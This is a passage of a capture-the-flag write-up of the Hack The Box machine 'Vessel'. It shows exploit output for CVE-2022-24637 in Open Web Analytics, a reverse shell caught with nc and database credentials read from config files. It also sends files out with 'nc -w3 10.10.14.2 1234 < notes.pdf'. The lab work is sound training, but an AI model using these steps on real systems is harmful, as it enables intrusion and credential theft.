font-weight: bold;
font-style: inherit;">|</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">__</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">)</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">__</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">)</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">____</span> __<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">)</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">||</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'_ \ |_ \  / / </span></span>
<span id="cb17-6"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;"> | |___  \ V / | |__|_____/ __/| |_| / __/ / __/_____/ __/|__   _| (_) |__) |/ /  </span></span>
<span id="cb17-7"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">  \____|  \_/  |_____|   |_____|\___/_____|_____|   |_____|  |_|  \___/____//_/   </span></span>
<span id="cb17-8"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">                            by 0xPThree - exploit.se</span></span>
<span id="cb17-9"></span>
<span id="cb17-10"></span>
<span id="cb17-11"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">[&gt;] PART 1: SINGLE / DOUBLE QUOTE CONFUSION</span></span>
<span id="cb17-12"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">[+] generationg cache file</span></span>
<span id="cb17-13"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">[+] admin cache found!</span></span>
<span id="cb17-14"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">[+] extracted temp_passkey: 19f5058761ee001e3addb0d3ad400da8</span></span>
<span id="cb17-15"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">[+] changed admin password to: exploit.se</span></span>
<span id="cb17-16"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">[+] admin login successful</span></span>
<span id="cb17-17"></span>
<span id="cb17-18"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">[&gt;] PART 2: PHP FILE WRITE</span></span>
<span id="cb17-19"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">[+] extracted nonce: 6d6ed4fecf</span></span>
<span id="cb17-20"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">[+] extracted log_dir: /var/www/html/owa/owa-data/logs/</span></span>
<span id="cb17-21"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">[+] updated log settings</span></span>
<span id="cb17-22"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">[+] wrote payload to file: http://openwebanalytics.vessel.htb/owa-data/logs/rev.php</span></span>
<span id="cb17-23"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">[&gt;] triggering payload</span></span>
<span id="cb17-24"></span>
<span id="cb17-25"></span>
<span id="cb17-26"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">➜  vessel nc -lvnp 4488                                                              </span></span>
<span id="cb17-27"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">listening on [any] 4488 ...</span></span>
<span id="cb17-28"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">connect to [10.10.14.4] from (UNKNOWN) [10.10.11.178] 49452</span></span>
<span id="cb17-29"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">bash: cannot set terminal process group (1005): Inappropriate ioctl for device</span></span>
<span id="cb17-30"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">bash: no job control in this shell</span></span>
<span id="cb17-31"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">www-data@vessel:/var/www/html/owa/owa-data/logs$ id &amp;&amp; hostname</span></span>
<span id="cb17-32"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">id &amp;&amp; hostname</span></span>
<span id="cb17-33"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span>
<span id="cb17-34"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">vessel</span></span></code></pre></div>
<p>Download my <strong>CVE-2022-24637</strong> script <a href="../../assets/scripts/vessel_cve-2022-24637.py">HERE</a>.</p>
<p><strong>NOTE:</strong> The script won’t take into account if the php cache file already exists, if that’s the case it will print <em>“admin login successful”</em> at the start even though it isnt. I’m to lazy to fix this, even though it’s solved with a simple if-statement.</p>
<p><img src="https://exploit.se/posts/2022-09-02-htb-writeup-vessel/images/vessel09.png" class="img-fluid"></p>
</section>
<section id="step-5" class="level3">
<h3 class="anchored" data-anchor-id="step-5">Step 5</h3>
<p>Enumerate the box manually and we find..</p>
<p>.. <strong>mysql</strong> credentials and data:</p>
<div class="sourceCode" id="cb18" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb18-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">www-data@vessel:/$</span> cat /var/www/html/owa/owa-config.php</span>
<span id="cb18-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb18-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">define</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'OWA_DB_TYPE'</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'mysql'</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">);</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">//</span> options: mysql</span>
<span id="cb18-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">define</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'OWA_DB_NAME'</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'owa'</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">);</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">//</span> name of the database</span>
<span id="cb18-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">define</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'OWA_DB_HOST'</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'localhost'</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">);</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">//</span> host name of the server housing the database</span>
<span id="cb18-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">define</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'OWA_DB_USER'</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'owauser'</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">);</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">//</span> database user</span>
<span id="cb18-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">define</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'OWA_DB_PORT'</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'3306'</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">);</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">//</span> port of database</span>
<span id="cb18-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">define</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'OWA_DB_PASSWORD'</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'Vux8*ZF3rek94%NW'</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">);</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">//</span> database users password</span>
<span id="cb18-9"></span>
<span id="cb18-10"></span>
<span id="cb18-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">www-data@vessel:/var/www/html/vessel/vessel/config$</span> cat db.js</span>
<span id="cb18-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">var</span> connection = {</span>
<span id="cb18-13">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">db:</span> {</span>
<span id="cb18-14">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">host</span>     : <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'localhost'</span>,</span>
<span id="cb18-15">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">user</span>     : <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'default'</span>,</span>
<span id="cb18-16">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">password</span> : <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'daqvACHKvRn84VdVp'</span>,</span>
<span id="cb18-17">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">database</span> : <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'vessel'</span></span>
<span id="cb18-18">    </span>
<span id="cb18-19"></span>
<span id="cb18-20"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">www-data@vessel:/var/www/html/owa/owa-data/logs$</span> netstat <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-tulpn</span></span>
<span id="cb18-21"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Proto</span> Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name            </span>
<span id="cb18-22"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">tcp</span>        0      0 127.0.0.1:33060         0.0.0.0:<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span>               LISTEN      <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span>                   </span>
<span id="cb18-23"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">tcp</span>        0      0 127.0.0.1:3306          0.0.0.0:<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span>               LISTEN      <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span>       </span>
<span id="cb18-24"></span>
<span id="cb18-25"></span>
<span id="cb18-26"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">www-data@vessel:/var/www/html/owa/owa-data/logs$</span> mysql owa <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-u</span> owauser <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p</span></span>
<span id="cb18-27"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Enter</span> password: Vux8<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span>ZF3rek94%NW</span>
<span id="cb18-28"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">mysql</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> use owa<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span></span>
<span id="cb18-29"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">mysql</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> select <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span> from owa_user<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span></span>
<span id="cb18-30"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+----+---------+--------------------------------------------------------------+-------+---------------+------------------+----------------------------------+---------------+------------------+----------------------------------+</span></span>
<span id="cb18-31"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">id</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">user_id</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">password</span>                                                     <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">role</span>  <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">real_name</span>     <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">email_address</span>    <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">temp_passkey</span>                     <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">creation_date</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">last_update_date</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">api_key</span>                          <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb18-32"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+----+---------+--------------------------------------------------------------+-------+---------------+------------------+----------------------------------+---------------+------------------+----------------------------------+</span></span>
<span id="cb18-33"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">1</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">admin</span>   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$2</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">y</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$1</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">0</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$4</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">0VVeZjtIFp7QY9FByW.y.wkTFkcEcOEmEPjpVbGbdxMIUbfKzc96</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">admin</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">default</span> admin <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">admin@vessel.htb</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">a48f104f6f995e9655fe771a039666ad</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">1650211659</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>       <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">1650211659</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">a390cc0247ecada9a2b8d2338b9ca6d2</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb18-34"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+----+---------+--------------------------------------------------------------+-------+---------------+------------------+----------------------------------+---------------+------------------+----------------------------------+</span></span>
<span id="cb18-35"></span>
<span id="cb18-36"></span>
<span id="cb18-37"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">www-data@vessel:/var/www/html/owa/owa-data/logs$</span> mysql <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-D</span> vessel <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-u</span> default <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p</span></span>
<span id="cb18-38"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Enter</span> password: daqvACHKvRn84VdVp</span>
<span id="cb18-39"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">mysql</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> use vessel<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span></span>
<span id="cb18-40"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">mysql</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> select <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span> from accounts<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span></span>
<span id="cb18-41"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+----+----------+----------------------------------+------------------+</span></span>
<span id="cb18-42"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">id</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">username</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">password</span>                         <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">email</span>            <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb18-43"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+----+----------+----------------------------------+------------------+</span></span>
<span id="cb18-44"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">1</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">admin</span>    <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">k</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span>N4Hf6TmHE<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">W]Uq</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"(RCj}V&gt;&amp;=rB</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$4</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">}&lt; | admin@vessel.htb |</span></span>
<span id="cb18-45"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">+----+----------+----------------------------------+------------------+</span></span></code></pre></div>
<p>.. read/execute privileges in user <code>steven</code>’s home directory:</p>
<div class="sourceCode" id="cb19" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb19-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">www-data@vessel:/home$</span> ls <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-al</span></span>
<span id="cb19-2"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">ls</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-al</span></span>
<span id="cb19-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">total</span> 16</span>
<span id="cb19-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-xr-x</span>  4 root   root   4096 Aug 11 14:43 .</span>
<span id="cb19-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-xr-x</span> 19 root   root   4096 Aug 11 14:43 ..</span>
<span id="cb19-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwx------</span>  5 ethan  ethan  4096 Aug 11 14:43 ethan</span>
<span id="cb19-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxrwxr-x</span>  3 steven steven 4096 Aug 11 14:43 steven</span>
<span id="cb19-8"></span>
<span id="cb19-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">www-data@vessel:/home$</span> ls <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-al</span> steven    </span>
<span id="cb19-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">total</span> 33796</span>
<span id="cb19-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxrwxr-x</span> 3 steven steven     4096 Aug 11 14:43 .</span>
<span id="cb19-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-xr-x</span> 4 root   root       4096 Aug 11 14:43 ..</span>
<span id="cb19-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">lrwxrwxrwx</span> 1 root   root          9 Apr 18 14:45 .bash_history <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> /dev/null</span>
<span id="cb19-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-------</span> 1 steven steven      220 Apr 17 18:38 .bash_logout</span>
<span id="cb19-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-------</span> 1 steven steven     3771 Apr 17 18:38 .bashrc</span>
<span id="cb19-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-xr-x</span> 2 ethan  steven     4096 Aug 11 14:43 .notes</span>
<span id="cb19-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-------</span> 1 steven steven      807 Apr 17 18:38 .profile</span>
<span id="cb19-18"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-r--r--</span> 1 ethan  steven 34578147 May  4 11:03 passwordGenerator</span>
<span id="cb19-19"></span>
<span id="cb19-20"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">www-data@vessel:/home/steven$</span> file passwordGenerator</span>
<span id="cb19-21"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">passwordGenerator:</span> PE32 executable <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">console</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Intel</span> 80386, for MS Windows</span></code></pre></div>
<p>.. two files in the <code>.notes</code> directory. Download and analyze them:</p>
<div class="sourceCode" id="cb20" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb20-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">www-data@vessel:/home/steven/.notes$</span> ls <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-al</span></span>
<span id="cb20-2"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">ls</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-al</span></span>
<span id="cb20-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">total</span> 40</span>
<span id="cb20-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-xr-x</span> 2 ethan  steven  4096 Aug 11 14:43 .</span>
<span id="cb20-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxrwxr-x</span> 3 steven steven  4096 Aug 11 14:43 ..</span>
<span id="cb20-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-r--r--</span> 1 ethan  steven 17567 Aug 10 18:42 notes.pdf</span>
<span id="cb20-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-r--r--</span> 1 ethan  steven 11864 May  2 21:36 screenshot.png</span>
<span id="cb20-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">www-data@vessel:/home/steven/.notes$</span> nc <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-w3</span> 10.10.14.2 1234 <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> notes.pdf</span>
<span id="cb20-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">nc</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-w3</span> 10.10.14.2 1234 <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> notes.pdf</span>
<span id="cb20-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">www-data@vessel:/home/steven/.notes$</span> nc <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-w3</span> 10.10.14.2 1234 <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> screenshot.png</span>
<span id="cb20-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">nc</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-w3</span> 10.10.14.2 1234 <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> screenshot.png</span></code></pre></div>
<p><em>screenshot.png:</em></p>
<p><img src="https://exploit.se/posts/2022-09-02-htb-writeup-vessel/images/vessel10.png" class="img-fluid"></p>
<p><em>notes.pdf:</em></p>
<p><img src="https://exploit.se/posts/2022-09-02-htb-writeup-vessel/images/vessel11.png" class="img-fluid"></p>
<p>None of the three found passwords unlocks the file, and we are unable to crack the PDF using <code>pdf2john</code> and <code>john</code>.</p>
<div class="sourceCode" id="cb21" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb21-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  vessel cat password.txt </span>
<span id="cb21-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Vux8*ZF3rek94%NW</span></span>
<span id="cb21-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">daqvACHKvRn84VdVp</span></span>
<span id="cb21-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">k</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span>N4Hf6TmHE<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">W]Uq</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"(RCj}V&gt;&amp;=rB</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$4</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">}&lt;</span></span></code></pre></div>
<p>Nor does any of the passwords work to escalate privileges using <code>su</code> and/or <code>ssh</code>. With <em>screenshot.png</em> pointing towards the <code>passwordGenerator</code> we probably need to dig deeper here, maybe calculated passwords are stored within, passwords are generated in the same order or they are generated with a constant value making the seeming “random” password only having x amount of possible iteration.</p>
<p>Looking on the file with <code>strings</code> we can see that it was compiled using <code>PyInstaller</code>:</p>
<div class="sourceCode" id="cb22" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb22-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  vessel strings passwordGenerator<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">grep</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-i</span> pyins</span>
<span id="cb22-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Cannot</span> open PyInstaller archive from executable <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">%s</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">or</span> external archive <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
